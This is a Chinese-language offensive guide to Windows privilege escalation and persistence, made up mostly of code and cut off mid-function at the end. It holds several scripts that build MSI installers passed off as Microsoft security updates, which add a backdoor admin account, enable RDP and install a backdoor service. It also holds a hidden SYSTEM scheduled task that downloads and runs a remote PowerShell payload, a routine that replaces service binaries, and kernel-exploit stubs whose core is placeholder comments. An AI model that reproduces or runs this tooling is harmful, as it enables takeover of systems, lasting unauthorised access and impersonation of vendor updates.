# Windows权限提升与持久化

## Windows提权

### 内核漏洞利用

#### 内核漏洞检测
```c
// kernel_exploit_detection.c
#include <windows.h>
#include <stdio.h>
#include <wtsapi32.h>
#include <psapi.h>

#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "psapi.lib")

// 检测系统信息和补丁级别
typedef struct _SYSTEM_INFO_EX {
    DWORD build_number;
    char version[64];
    BOOL is_domain_controller;
    DWORD hotfix_count;
} SYSTEM_INFO_EX, *PSYSTEM_INFO_EX;

// 获取详细的系统信息
BOOL get_system_info_ex(PSYSTEM_INFO_EX sys_info) {
    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    
    if (!GetVersionExA((LPOSVERSIONINFOA)&osvi)) {
        return FALSE;
    }
    
    // 获取构建号
    sys_info->build_number = osvi.dwBuildNumber;
    
    // 获取版本字符串
    sprintf(sys_info->version, "Windows %d.%d Build %d SP %d.%d",
            osvi.dwMajorVersion, osvi.dwMinorVersion,
            osvi.dwBuildNumber, osvi.wServicePackMajor, osvi.wServicePackMinor);
    
    // 检查是否为域控制器
    OSVERSIONINFOEXA osvi_check = {0};
    osvi_check.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    osvi_check.wProductType = VER_NT_DOMAIN_CONTROLLER;
    
    DWORDLONG condition_mask = 0;
    VER_SET_CONDITION(condition_mask, VER_PRODUCT_TYPE, VER_EQUAL);
    
    sys_info->is_domain_controller = VerifyVersionInfoA(&osvi_check, VER_PRODUCT_TYPE, condition_mask);
    
    // 获取补丁信息
    sys_info->hotfix_count = 0;
    
    return TRUE;
}

// 常见内核漏洞检测
BOOL check_kernel_vulnerabilities(PSYSTEM_INFO_EX sys_info) {
    struct {
        DWORD build_number;
        const char* cve;
        const char* description;
    } kernel_vulns[] = {
        {10240, "CVE-2016-0051", "Win32k privilege escalation"},
        {10586, "CVE-2016-0099", "Win32k privilege escalation"},
        {14393, "CVE-2016-7255", "Win32k privilege escalation"},
        {15063, "CVE-2017-0263", "Win32k privilege escalation"},
        {16299, "CVE-2018-8120", "Win32k privilege escalation"},
        {17134, "CVE-2018-8440", "ALPC privilege escalation"},
        {17763, "CVE-2019-0859", "Win32k privilege escalation"},
        {18362, "CVE-2019-1315", "Win32k privilege escalation"},
        {18363, "CVE-2020-1054", "Win32k privilege escalation"},
        {19041, "CVE-2021-1732", "Win32k privilege escalation"}
    };
    
    printf("\n[*] Checking for known kernel vulnerabilities...\n");
    printf("System Build Number: %d\n", sys_info->build_number);
    
    for (int i = 0; i < sizeof(kernel_vulns) / sizeof(kernel_vulns[0]); i++) {
        if (sys_info->build_number <= kernel_vulns[i].build_number) {
            printf("[!] Potential vulnerability: %s - %s\n", 
                   kernel_vulns[i].cve, kernel_vulns[i].description);
            return TRUE;
        }
    }
    
    printf("[+] No known kernel vulnerabilities detected\n");
    return FALSE;
}
```

#### 内核漏洞利用框架
```c
// kernel_exploit_framework.c
#include <windows.h>
#include <stdio.h>

typedef struct _KERNEL_EXPLOIT {
    const char* name;
    const char* cve;
    BOOL (*check_vulnerability)();
    BOOL (*exploit)();
    const char* description;
} KERNEL_EXPLOIT, *PKERNEL_EXPLOIT;

// CVE-2016-0099 (Win32k privilege escalation)
BOOL check_cve_2016_0099() {
    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    
    if (!GetVersionExA((LPOSVERSIONINFOA)&osvi)) {
        return FALSE;
    }
    
    // Windows 7 SP1, Windows 8.1, Windows 10
    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1) { // Windows 7
        return (osvi.dwBuildNumber <= 7601); // SP1
    } else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 3) { // Windows 8.1
        return (osvi.dwBuildNumber <= 9600);
    } else if (osvi.dwMajorVersion == 10) { // Windows 10
        return (osvi.dwBuildNumber <= 10586); // 1511
    }
    
    return FALSE;
}

BOOL exploit_cve_2016_0099() {
    printf("[*] Attempting CVE-2016-0099 exploit...\n");
    
    // 创建窗口类
    WNDCLASSEXA wnd_class = {0};
    wnd_class.cbSize = sizeof(WNDCLASSEXA);
    wnd_class.lpfnWndProc = DefWindowProcA;
    wnd_class.lpszClassName = "ExploitClass";
    wnd_class.hInstance = GetModuleHandle(NULL);
    
    if (!RegisterClassExA(&wnd_class)) {
        printf("[!] Failed to register window class\n");
        return FALSE;
    }
    
    // 创建窗口
    HWND hWnd = CreateWindowExA(
        0,
        "ExploitClass",
        "ExploitWindow",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        CW_USEDEFAULT, CW_USEDEFAULT,
        NULL, NULL,
        GetModuleHandle(NULL),
        NULL
    );
    
    if (hWnd == NULL) {
        printf("[!] Failed to create window\n");
        return FALSE;
    }
    
    // 触发漏洞
    // 这里应该包含实际的漏洞利用代码
    printf("[+] Window created, triggering vulnerability...\n");
    
    // 清理
    DestroyWindow(hWnd);
    UnregisterClassA("ExploitClass", GetModuleHandle(NULL));
    
    return TRUE;
}

// CVE-2020-1054 (Win32k privilege escalation)
BOOL check_cve_2020_1054() {
    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    
    if (!GetVersionExA((LPOSVERSIONINFOA)&osvi)) {
        return FALSE;
    }
    
    // Windows 10 versions
    if (osvi.dwMajorVersion == 10) {
        return (osvi.dwBuildNumber <= 18363); // Windows 10 1909
    }
    
    return FALSE;
}

BOOL exploit_cve_2020_1054() {
    printf("[*] Attempting CVE-2020-1054 exploit...\n");
    
    // 获取窗口站
    HWINSTA hWinSta = GetProcessWindowStation();
    if (hWinSta == NULL) {
        printf("[!] Failed to get window station\n");
        return FALSE;
    }
    
    // 创建桌面
    HDESK hDesk = CreateDesktopA(
        "ExploitDesktop",
        NULL, NULL, 0,
        GENERIC_ALL, NULL
    );
    
    if (hDesk == NULL) {
        printf("[!] Failed to create desktop\n");
        return FALSE;
    }
    
    // 设置桌面
    if (!SetThreadDesktop(hDesk)) {
        printf("[!] Failed to set thread desktop\n");
        CloseDesktop(hDesk);
        return FALSE;
    }
    
    // 触发漏洞
    printf("[+] Desktop created, triggering vulnerability...\n");
    
    // 这里应该包含实际的漏洞利用代码
    
    // 清理
    CloseDesktop(hDesk);
    
    return TRUE;
}

// 内核漏洞利用框架
KERNEL_EXPLOIT kernel_exploits[] = {
    {
        "Win32k Privilege Escalation",
        "CVE-2016-0099",
        check_cve_2016_0099,
        exploit_cve_2016_0099,
        "Win32k.sys privilege escalation vulnerability"
    },
    {
        "Win32k Privilege Escalation",
        "CVE-2020-1054",
        check_cve_2020_1054,
        exploit_cve_2020_1054,
        "Win32k.sys privilege escalation vulnerability"
    }
};

// 自动检测和利用内核漏洞
BOOL auto_kernel_exploit() {
    printf("[*] Starting automatic kernel exploit detection...\n");
    
    for (int i = 0; i < sizeof(kernel_exploits) / sizeof(kernel_exploits[0]); i++) {
        printf("\n[*] Checking %s (%s)\n", kernel_exploits[i].name, kernel_exploits[i].cve);
        printf("Description: %s\n", kernel_exploits[i].description);
        
        if (kernel_exploits[i].check_vulnerability()) {
            printf("[!] System appears vulnerable to %s\n", kernel_exploits[i].cve);
            
            printf("[*] Attempting exploit...\n");
            if (kernel_exploits[i].exploit()) {
                printf("[+] Exploit succeeded!\n");
                return TRUE;
            } else {
                printf("[!] Exploit failed\n");
            }
        } else {
            printf("[+] System not vulnerable to %s\n", kernel_exploits[i].cve);
        }
    }
    
    printf("\n[!] No suitable kernel exploit found\n");
    return FALSE;
}
```

### 服务配置错误

#### 服务权限检查
```c
// service_exploitation.c
#include <windows.h>
#include <stdio.h>
#include <aclapi.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "aclui.lib")

typedef struct _SERVICE_VULNERABILITY {
    const char* service_name;
    DWORD vulnerable_permission;
    const char* description;
    BOOL (*check_function)(SC_HANDLE, const char*);
} SERVICE_VULNERABILITY, *PSERVICE_VULNERABILITY;

// 检查服务权限
BOOL check_service_permissions(SC_HANDLE hSCManager, const char* service_name) {
    SC_HANDLE hService = OpenServiceA(hSCManager, service_name, READ_CONTROL);
    if (hService == NULL) return FALSE;
    
    PSECURITY_DESCRIPTOR pSD = NULL;
    DWORD sd_size = 0;
    
    // 获取安全描述符大小
    QueryServiceObjectSecurity(hService, DACL_SECURITY_INFORMATION, NULL, 0, &sd_size);
    if (sd_size == 0) {
        CloseServiceHandle(hService);
        return FALSE;
    }
    
    // 分配内存并获取安全描述符
    pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, sd_size);
    if (pSD == NULL) {
        CloseServiceHandle(hService);
        return FALSE;
    }
    
    if (!QueryServiceObjectSecurity(hService, DACL_SECURITY_INFORMATION, pSD, sd_size, &sd_size)) {
        LocalFree(pSD);
        CloseServiceHandle(hService);
        return FALSE;
    }
    
    // 检查DACL
    BOOL bDaclPresent;
    PACL pDacl;
    BOOL bDaclDefaulted;
    
    if (!GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted)) {
        LocalFree(pSD);
        CloseServiceHandle(hService);
        return FALSE;
    }
    
    if (bDaclPresent && pDacl != NULL) {
        // 遍历ACE
        for (DWORD i = 0; i < pDacl->AceCount; i++) {
            PACE_HEADER pAceHeader;
            if (GetAce(pDacl, i, (LPVOID*)&pAceHeader)) {
                if (pAceHeader->AceType == ACCESS_ALLOWED_ACE_TYPE) {
                    PACCESS_ALLOWED_ACE pAce = (PACCESS_ALLOWED_ACE)pAceHeader;
                    
                    // 检查是否是Everyone组
                    SID_IDENTIFIER_AUTHORITY siaWorld = SECURITY_WORLD_SID_AUTHORITY;
                    PSID pEveryoneSid = NULL;
                    AllocateAndInitializeSid(&siaWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSid);
                    
                    if (pEveryoneSid && EqualSid(&pAce->SidStart, pEveryoneSid)) {
                        DWORD mask = pAce->Mask;
                        
                        // 检查关键权限
                        if (mask & SERVICE_CHANGE_CONFIG) {
                            printf("[!] Service %s allows Everyone to change configuration\n", service_name);
                            FreeSid(pEveryoneSid);
                            LocalFree(pSD);
                            CloseServiceHandle(hService);
                            return TRUE;
                        }
                        
                        if (mask & SERVICE_START) {
                            printf("[!] Service %s allows Everyone to start service\n", service_name);
                        }
                        
                        if (mask & SERVICE_STOP) {
                            printf("[!] Service %s allows Everyone to stop service\n", service_name);
                        }
                        
                        FreeSid(pEveryoneSid);
                    }
                }
            }
        }
    }
    
    LocalFree(pSD);
    CloseServiceHandle(hService);
    return FALSE;
}

// 检查可执行文件权限
BOOL check_executable_permissions(const char* binary_path) {
    // 检查文件是否可写
    if (GetFileAttributesA(binary_path) == INVALID_FILE_ATTRIBUTES) {
        return FALSE;
    }
    
    // 尝试以写模式打开文件
    HANDLE hFile = CreateFileA(binary_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        printf("[!] Service binary is writable: %s\n", binary_path);
        return TRUE;
    }
    
    return FALSE;
}

// 服务漏洞利用
BOOL exploit_service(SC_HANDLE hSCManager, const char* service_name) {
    SC_HANDLE hService = OpenServiceA(hSCManager, service_name, SERVICE_CHANGE_CONFIG | SERVICE_QUERY_CONFIG);
    if (hService == NULL) return FALSE;
    
    // 获取当前服务配置
    char current_path[MAX_PATH] = {0};
    DWORD buffer_size = sizeof(current_path);
    
    if (QueryServiceConfigA(hService, (LPQUERY_SERVICE_CONFIGA)current_path, buffer_size, &buffer_size)) {
        LPQUERY_SERVICE_CONFIGA config = (LPQUERY_SERVICE_CONFIGA)current_path;
        printf("[*] Current service binary path: %s\n", config->lpBinaryPathName);
        
        // 检查二进制文件是否可写
        if (check_executable_permissions(config->lpBinaryPathName)) {
            printf("[!] Service binary is vulnerable to DLL hijacking or replacement\n");
            
            // 创建恶意二进制文件
            char malicious_binary[MAX_PATH];
            sprintf(malicious_binary, "%s.bak", config->lpBinaryPathName);
            
            // 复制原始文件
            CopyFileA(config->lpBinaryPathName, malicious_binary, FALSE);
            
            // 这里应该写入恶意代码
            printf("[*] Replace %s with malicious binary\n", config->lpBinaryPathName);
            
            // 重启服务
            ControlService(hService, SERVICE_CONTROL_STOP, NULL);
            Sleep(1000);
            StartServiceA(hService, 0, NULL);
            
            CloseServiceHandle(hService);
            return TRUE;
        }
    }
    
    CloseServiceHandle(hService);
    return FALSE;
}

// 常见脆弱服务检查
SERVICE_VULNERABILITY vulnerable_services[] = {
    {
        "Apache2.4",
        SERVICE_CHANGE_CONFIG,
        "Apache web server service",
        check_service_permissions
    },
    {
        "MySQL",
        SERVICE_CHANGE_CONFIG,
        "MySQL database service",
        check_service_permissions
    },
    {
        "Tomcat9",
        SERVICE_CHANGE_CONFIG,
        "Apache Tomcat service",
        check_service_permissions
    },
    {
        "OpenVPNService",
        SERVICE_CHANGE_CONFIG,
        "OpenVPN service",
        check_service_permissions
    }
};

// 自动服务漏洞扫描
BOOL auto_service_exploit() {
    printf("[*] Starting service vulnerability scan...\n");
    
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager == NULL) {
        printf("[!] Failed to open service manager\n");
        return FALSE;
    }
    
    // 枚举所有服务
    DWORD services_returned = 0;
    DWORD resume_handle = 0;
    BYTE services_buffer[1024 * 64] = {0}; // 64KB缓冲区
    
    if (EnumServicesStatusA(hSCManager, SERVICE_WIN32, SERVICE_STATE_ALL,
                           (LPENUM_SERVICE_STATUSA)services_buffer, sizeof(services_buffer),
                           &services_returned, &services_returned, &resume_handle)) {
        
        LPENUM_SERVICE_STATUSA services = (LPENUM_SERVICE_STATUSA)services_buffer;
        DWORD service_count = services_returned / sizeof(ENUM_SERVICE_STATUSA);
        
        for (DWORD i = 0; i < service_count; i++) {
            printf("\n[*] Checking service: %s\n", services[i].lpServiceName);
            
            // 检查服务权限
            if (check_service_permissions(hSCManager, services[i].lpServiceName)) {
                printf("[!] Service %s has vulnerable permissions\n", services[i].lpServiceName);
                
                // 尝试利用
                if (exploit_service(hSCManager, services[i].lpServiceName)) {
                    printf("[+] Service exploited successfully\n");
                }
            }
        }
    }
    
    CloseServiceHandle(hSCManager);
    return TRUE;
}
```

### AlwaysInstallElevated

#### MSI安装包提权
```vbscript
' always_install_elevated.vbs
Set installer = CreateObject("WindowsInstaller.Installer")

' 检查AlwaysInstallElevated设置
Dim regValue
Set shell = CreateObject("WScript.Shell")

' 检查HKLM
On Error Resume Next
regValue = shell.RegRead("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated")
If Err.Number = 0 And regValue = 1 Then
    WScript.Echo "[!] AlwaysInstallElevated enabled in HKLM"
End If
Err.Clear

' 检查HKCU
regValue = shell.RegRead("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated")
If Err.Number = 0 And regValue = 1 Then
    WScript.Echo "[!] AlwaysInstallElevated enabled in HKCU"
End If
On Error GoTo 0

' 创建恶意MSI文件
Sub CreateMaliciousMSI()
    Dim installer : Set installer = CreateObject("WindowsInstaller.Installer")
    Dim database : Set database = installer.CreateDatabase("malicious.msi", 2)
    
    ' 创建Property表
    Dim query : query = "CREATE TABLE Property (Property CHAR(72), Value CHAR(0) LOCALIZABLE)"
    database.Execute(query)
    
    ' 插入属性
    query = "INSERT INTO Property (Property, Value) VALUES ('ProductName', 'Security Update')"
    database.Execute(query)
    
    query = "INSERT INTO Property (Property, Value) VALUES ('ProductVersion', '1.0.0')"
    database.Execute(query)
    
    ' 创建CustomAction表
    query = "CREATE TABLE CustomAction (Action CHAR(72), Type INTEGER, Source CHAR(72), Target CHAR(255))"
    database.Execute(query)
    
    ' 插入自定义动作（执行命令）
    query = "INSERT INTO CustomAction (Action, Type, Source, Target) VALUES ('SystemCommand', 3074, 'cmd.exe', '/c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add')"
    database.Execute(query)
    
    ' 创建InstallExecuteSequence表
    query = "CREATE TABLE InstallExecuteSequence (Action CHAR(72), Condition CHAR(255), Sequence INTEGER)"
    database.Execute(query)
    
    ' 插入执行序列
    query = "INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) VALUES ('SystemCommand', NULL, 1)"
    database.Execute(query)
    
    ' 提交数据库
    database.Commit
    
    WScript.Echo "[+] Malicious MSI created: malicious.msi"
End Sub

' 执行MSI文件
Sub ExecuteMSI()
    Dim shell : Set shell = CreateObject("WScript.Shell")
    Dim result
    
    WScript.Echo "[*] Executing malicious MSI..."
    result = shell.Run("msiexec /i malicious.msi /quiet /qn", 0, True)
    
    If result = 0 Then
        WScript.Echo "[+] MSI executed successfully"
    Else
        WScript.Echo "[!] MSI execution failed"
    End If
End Sub

' 主函数
Sub Main()
    CreateMaliciousMSI()
    ExecuteMSI()
End Sub

Main()
```

#### 高级MSI生成器
```python
# msi_generator.py
import msilib
import os
from datetime import datetime

class MSIGenerator:
    def __init__(self, output_path):
        self.output_path = output_path
        self.db = None
    
    def create_database(self):
        """创建MSI数据库"""
        self.db = msilib.init_database(self.output_path, msilib.MSIDBOPEN_CREATE)
        return self.db is not None
    
    def add_properties(self):
        """添加属性表"""
        # 创建Property表
        prop_table = msilib.add_table(self.db, 'Property', 2)
        msilib.add_column(self.db, 'Property', 1, 's', 72, False, None)
        msilib.add_column(self.db, 'Property', 2, 'l', 0, True, None)
        
        # 添加基本属性
        properties = [
            ('ProductName', 'Security Update 2024'),
            ('ProductVersion', '1.0.0'),
            ('Manufacturer', 'Microsoft Corporation'),
            ('ProductCode', msilib.gen_uuid()),
            ('UpgradeCode', msilib.gen_uuid()),
            ('Language', '1033'),
            ('Version', '100'),
            ('Description', 'Critical Security Update'),
            ('Comments', 'This update addresses security vulnerabilities'),
            ('Template', 'Intel;1033'),
            ('Platform', 'x64'),
            ('SecureCustomProperties', 'SYSTEMCOMMAND')
        ]
        
        for prop_name, prop_value in properties:
            msilib.add_data(self.db, 'Property', [(prop_name, prop_value)])
    
    def add_custom_actions(self):
        """添加自定义动作"""
        # 创建CustomAction表
        ca_table = msilib.add_table(self.db, 'CustomAction', 4)
        msilib.add_column(self.db, 'CustomAction', 1, 's', 72, False, None)
        msilib.add_column(self.db, 'CustomAction', 2, 'i', 2, False, None)
        msilib.add_column(self.db, 'CustomAction', 3, 's', 72, False, None)
        msilib.add_column(self.db, 'CustomAction', 4, 's', 255, True, None)
        
        # 添加系统命令
        custom_actions = [
            ('SystemCommand', 3074, 'cmd.exe', '/c net user redteam RedTeam123! /add'),
            ('AddToAdmin', 3074, 'cmd.exe', '/c net localgroup administrators redteam /add'),
            ('EnableRDP', 3074, 'cmd.exe', '/c reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'),
            ('AddFirewallRule', 3074, 'cmd.exe', '/c netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389'),
            ('CreateBackdoor', 3074, 'cmd.exe', '/c sc create RedTeamService binPath= "cmd.exe /k C:\\Windows\\Temp\\backdoor.exe" start= auto'),
            ('StartBackdoor', 3074, 'cmd.exe', '/c sc start RedTeamService')
        ]
        
        for action_name, action_type, source, target in custom_actions:
            msilib.add_data(self.db, 'CustomAction', [(action_name, action_type, source, target)])
    
    def add_install_sequence(self):
        """添加安装序列"""
        # 创建InstallExecuteSequence表
        ies_table = msilib.add_table(self.db, 'InstallExecuteSequence', 3)
        msilib.add_column(self.db, 'InstallExecuteSequence', 1, 's', 72, False, None)
        msilib.add_column(self.db, 'InstallExecuteSequence', 2, 'c', 255, True, None)
        msilib.add_column(self.db, 'InstallExecuteSequence', 3, 'i', 2, False, None)
        
        # 添加执行序列（注意顺序）
        sequences = [
            ('SystemCommand', None, 1),
            ('AddToAdmin', None, 2),
            ('EnableRDP', None, 3),
            ('AddFirewallRule', None, 4),
            ('CreateBackdoor', None, 5),
            ('StartBackdoor', None, 6)
        ]
        
        for action, condition, sequence in sequences:
            msilib.add_data(self.db, 'InstallExecuteSequence', [(action, condition, sequence)])
    
    def add_directories(self):
        """添加目录结构"""
        # 创建Directory表
        dir_table = msilib.add_table(self.db, 'Directory', 3)
        msilib.add_column(self.db, 'Directory', 1, 's', 72, False, None)
        msilib.add_column(self.db, 'Directory', 2, 's', 72, True, None)
        msilib.add_column(self.db, 'Directory', 3, 's', 255, True, None)
        
        # 添加目录
        directories = [
            ('TARGETDIR', None, 'SourceDir'),
            ('ProgramFiles64Folder', 'TARGETDIR', 'PFiles'),
            ('INSTALLFOLDER', 'ProgramFiles64Folder', 'SecurityUpdate'),
            ('System64Folder', 'TARGETDIR', 'System64'),
            ('TempFolder', 'TARGETDIR', 'Temp')
        ]
        
        for dir_id, dir_parent, dir_name in directories:
            msilib.add_data(self.db, 'Directory', [(dir_id, dir_parent, dir_name)])
    
    def add_components(self):
        """添加组件"""
        # 创建Component表
        comp_table = msilib.add_table(self.db, 'Component', 4)
        msilib.add_column(self.db, 'Component', 1, 's', 72, False, None)
        msilib.add_column(self.db, 'Component', 2, 'g', 38, False, None)
        msilib.add_column(self.db, 'Component', 3, 's', 72, False, None)
        msilib.add_column(self.db, 'Component', 4, 'i', 2, False, None)
        
        # 生成组件GUID
        component_guid = msilib.gen_uuid()
        
        # 添加主组件
        msilib.add_data(self.db, 'Component', [('MainComponent', component_guid, 'INSTALLFOLDER', 4)])
    
    def add_features(self):
        """添加功能"""
        # 创建Feature表
        feat_table = msilib.add_table(self.db, 'Feature', 6)
        msilib.add_column(self.db, 'Feature', 1, 's', 38, False, None)
        msilib.add_column(self.db, 'Feature', 2, 's', 255, True, None)
        msilib.add_column(self.db, 'Feature', 3, 'c', 255, True, None)
        msilib.add_column(self.db, 'Feature', 4, 'i', 2, True, None)
        msilib.add_column(self.db, 'Feature', 5, 'L', 72, True, None)
        msilib.add_column(self.db, 'Feature', 6, 'i', 2, True, None)
        
        # 生成Feature GUID
        feature_guid = msilib.gen_uuid()
        
        # 添加功能
        msilib.add_data(self.db, 'Feature', [(feature_guid, 'Complete', None, None, 1, 'MainComponent')])
    
    def generate_msi(self):
        """生成完整的MSI文件"""
        try:
            # 创建数据库
            if not self.create_database():
                print("[!] Failed to create MSI database")
                return False
            
            # 添加各个表和数据
            self.add_properties()
            self.add_directories()
            self.add_components()
            self.add_features()
            self.add_custom_actions()
            self.add_install_sequence()
            
            # 提交数据库
            self.db.Commit()
            
            print(f"[+] MSI file created successfully: {self.output_path}")
            return True
            
        except Exception as e:
            print(f"[!] Error creating MSI: {e}")
            return False
        finally:
            if self.db:
                self.db.Close()

# 使用示例
generator = MSIGenerator("security_update.msi")
generator.generate_msi()
```

---

## Windows持久化

### 计划任务

#### 恶意计划任务创建
```powershell
# malicious_scheduled_task.ps1

# 创建隐藏的计划任务
$task_name = "WindowsSecurityUpdate"
$task_description = "Windows Security Update Service"

# 创建任务动作
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')`""

# 创建触发器（多种触发方式）
$triggers = @(
    # 系统启动时
    New-ScheduledTaskTrigger -AtStartup
    
    # 每小时执行一次
    New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)
    
    # 用户登录时
    New-ScheduledTaskTrigger -AtLogOn
    
    # 每天特定时间
    New-ScheduledTaskTrigger -Daily -At "02:00"
)

# 创建任务设置
$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RunOnlyIfNetworkAvailable `
    -Hidden `
    -WakeToRun `
    -ExecutionTimeLimit (New-TimeSpan -Hours 1)

# 创建任务主体（以SYSTEM权限运行）
$principal = New-ScheduledTaskPrincipal `
    -UserId "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Highest

# 注册任务
Register-ScheduledTask `
    -TaskName $task_name `
    -Description $task_description `
    -Action $action `
    -Trigger $triggers `
    -Settings $settings `
    -Principal $principal `
    -Force

# 隐藏任务（可选）
$task_path = "\Microsoft\Windows\Windows Security\$task_name"
$hidden_task = Get-ScheduledTask -TaskName $task_name
$hidden_task.Settings.AllowDemandStart = $false
$hidden_task.Settings.DisallowStartIfOnBatteries = $false
$hidden_task.Settings.StopIfGoingOnBatteries = $false

Set-ScheduledTask -InputObject $hidden_task
```

#### 高级计划任务混淆
```c
// scheduled_task_obfuscation.c
#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <stdio.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")

// 创建混淆的计划任务
BOOL create_obfuscated_scheduled_task() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;
    
    // 创建任务服务
    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                         IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        CoUninitialize();
        return FALSE;
    }
    
    // 连接到任务服务
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return FALSE;
    }
    
    // 获取根文件夹
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t("\\"), &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return FALSE;
    }
    
    // 创建任务定义
    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) {
        pRootFolder->Release();
        pService->Release();
        CoUninitialize();
        return FALSE;
    }
    
    // 设置注册信息
    IRegistrationInfo* pRegInfo = NULL;
    hr = pTask->get_RegistrationInfo(&pRegInfo);
    if (SUCCEEDED(hr)) {
        pRegInfo->put_Author(_bstr_t("Microsoft Corporation"));
        pRegInfo->put_Description(_bstr_t("Windows Security Update Service"));
        pRegInfo->put_Version(_bstr_t("1.0"));
        pRegInfo->Release();
    }
    
    // 设置主体（以SYSTEM权限运行）
    IPrincipal* pPrincipal = NULL;
    hr = pTask->get_Principal(&pPrincipal);
    if (SUCCEEDED(hr)) {
        pPrincipal->put_Id(_bstr_t("LocalSystem"));
        pPrincipal->put_UserId(_bstr_t("SYSTEM"));
        pPrincipal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
        pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
        pPrincipal->Release();
    }
    
    // 设置设置
    ITaskSettings* pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (SUCCEEDED(hr)) {
        pSettings->put_AllowDemandStart(VARIANT_FALSE);
        pSettings->put_AllowHardTerminate(VARIANT_FALSE);
        pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
        pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
        pSettings->put_Hidden(VARIANT_TRUE);
        pSettings->put_StartWhenAvailable(VARIANT_TRUE);
        pSettings->put_WakeToRun(VARIANT_TRUE);
        pSettings->put_ExecutionTimeLimit(_bstr_t("PT1H")); // 1小时限制
        
        // 设置空闲条件
        IIdleSettings* pIdleSettings = NULL;
        hr = pSettings->get_IdleSettings(&pIdleSettings);
        if (SUCCEEDED(hr)) {
            pIdleSettings->put_StopOnIdleEnd(VARIANT_FALSE);
            pIdleSettings->put_RestartOnIdle(VARIANT_FALSE);
            pIdleSettings->Release();
        }
        
        pSettings->Release();
    }
    
    // 创建触发器集合
    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (SUCCEEDED(hr)) {
        // 创建开机触发器
        ITrigger* pTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_BOOT, &pTrigger);
        if (SUCCEEDED(hr)) {
            IBootTrigger* pBootTrigger = NULL;
            hr = pTrigger->QueryInterface(IID_IBootTrigger, (void**)&pBootTrigger);
            if (SUCCEEDED(hr)) {
                pBootTrigger->put_Id(_bstr_t("BootTrigger"));
                pBootTrigger->put_Delay(_bstr_t("PT30S")); // 30秒延迟
                pBootTrigger->Release();
            }
            pTrigger->Release();
        }
        
        // 创建每日触发器
        pTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_DAILY, &pTrigger);
        if (SUCCEEDED(hr)) {
            IDailyTrigger* pDailyTrigger = NULL;
            hr = pTrigger->QueryInterface(IID_IDailyTrigger, (void**)&pDailyTrigger);
            if (SUCCEEDED(hr)) {
                pDailyTrigger->put_Id(_bstr_t("DailyTrigger"));
                pDailyTrigger->put_StartBoundary(_bstr_t("2024-01-01T02:00:00")); // 凌晨2点
                pDailyTrigger->put_DaysInterval((short)1);
                pDailyTrigger->Release();
            }
            pTrigger->Release();
        }
        
        pTriggerCollection->Release();
    }
    
    // 创建动作
    IActionCollection* pActionCollection = NULL;
    hr = pTask->get_Actions(&pActionCollection);
    if (SUCCEEDED(hr)) {
        IAction* pAction = NULL;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        if (SUCCEEDED(hr)) {
            IExecAction* pExecAction = NULL;
            hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
            if (SUCCEEDED(hr)) {
                // 使用混淆的命令
                pExecAction->put_Path(_bstr_t("powershell.exe"));
